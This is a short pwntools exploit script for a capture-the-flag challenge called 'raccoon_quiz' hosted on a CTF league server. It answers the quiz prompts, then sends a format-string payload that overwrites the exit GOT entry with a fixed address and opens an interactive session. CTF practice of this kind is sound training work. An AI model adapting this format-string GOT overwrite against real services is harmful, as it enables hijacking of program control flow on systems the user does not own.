#!/usr/bin/env python

import os
import sys
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context(arch="amd64")

#p = process("./raccoon_quiz")
p = remote("chal.ctf-league.osusec.org", 4816)
elf = ELF("./raccoon_quiz")
addr = elf.got["exit"]
print(hex(addr))
#gdb.attach(p,'')
p.recv()
p.sendline("A")
p.recv()
p.sendline("B")
p.recv()
p.sendline("A")
print(p.recvline())
print(p.recvline())
print(p.recvline())
writes = {addr:0x400747}
payload = fmtstr_payload(6, writes)
"%1234x %5$n %4567x %6$n 0x1111111 0+1111112"
p.sendline(payload)
p.interactive()
